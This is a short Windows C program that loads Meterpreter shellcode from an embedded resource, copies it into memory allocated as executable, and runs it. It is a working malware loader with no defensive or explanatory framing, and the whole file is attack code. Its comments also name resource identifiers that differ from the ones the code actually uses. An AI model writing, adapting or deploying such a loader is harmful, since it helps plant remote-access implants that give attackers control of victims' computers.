// file with the meterpreter

#include <stdio.h>
#include <windows.h>

#define IDI_BIN1 102

int main()
{
        // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
        // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
        HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDI_BIN1), "BIN1");
        DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
        HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

        void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shellcodeResouceData, shellcodeSize);
        ((void(*)())exec)();

        return  0;
}
